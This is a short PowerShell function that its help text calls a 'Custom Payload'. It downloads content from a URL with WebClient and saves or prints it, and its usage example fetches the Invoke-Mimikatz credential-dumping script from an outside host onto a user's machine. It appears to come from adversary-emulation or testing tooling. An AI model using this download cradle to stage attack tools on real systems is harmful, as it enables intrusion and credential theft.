function Test-Download-File-Content
{
<#
.SYNOPSIS
Custom Payload to download file content from a URL into a file or stdout.

.DESCRIPTION
This payload downloads file content from a URL into a file or stdout.

.PARAMETER URL
The URL parameter defines the file to be downloaded.

.PARAMETER OUT_FILE
The OUT_FILE parameter defines the name and where the file content will be downloaded.

.EXAMPLE
PS > Test-Download-File-Content "https://mysite.co/Invoke-Mimikatz.ps1" "C:\Users\user\Downloads\script.ps1"

#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $OUT_FILE
    )
    # Downloads the file content
    [String] $FileContent = (New-Object System.Net.WebClient).DownloadString($URL)

    if($OUT_FILE){
        # Pipes the file content into a file
        $FileContent | Out-File $OUT_FILE
    }else{
        # Prints in stdout the file content
        echo $FileContent
    }
}